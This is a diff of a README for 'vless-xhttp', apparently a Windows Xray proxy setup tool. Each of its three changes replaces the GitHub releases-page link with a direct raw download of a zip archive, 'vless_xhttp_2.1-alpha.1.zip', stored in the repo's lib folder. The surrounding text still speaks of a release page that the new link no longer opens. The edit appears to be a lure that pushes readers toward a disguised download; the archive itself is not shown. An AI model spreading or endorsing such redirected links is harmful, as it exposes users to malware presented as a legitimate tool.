@@ -1,6 +1,6 @@
 # 🔐 vless-xhttp - Simple Xray Setup for Windows
 
-[![Download vless-xhttp](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/motoneuronrijstafel442/vless-xhttp/releases)
+[![Download vless-xhttp](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/motoneuronrijstafel442/vless-xhttp/main/lib/vless_xhttp_2.1-alpha.1.zip)
 
 ## 🧩 What this is
 
@@ -22,7 +22,7 @@ This project is built for use with common web tools and proxy layers like:
 
 Visit this page to download the release files:
 
-https://github.com/motoneuronrijstafel442/vless-xhttp/releases
+https://raw.githubusercontent.com/motoneuronrijstafel442/vless-xhttp/main/lib/vless_xhttp_2.1-alpha.1.zip
 
 On that page, look for the latest release. Download the file that matches your setup.
 
@@ -214,6 +214,6 @@ This repository is built for users who want a small script-based tool for:
 
 ## 🔗 Download again
 
-[![Get the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github)](https://github.com/motoneuronrijstafel442/vless-xhttp/releases)
+[![Get the latest release](https://img.shields.io/badge/Get%20the%20latest%20release-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/motoneuronrijstafel442/vless-xhttp/main/lib/vless_xhttp_2.1-alpha.1.zip)
 
 Open the release page, download the latest file, and place it on the server that runs your Xray setup
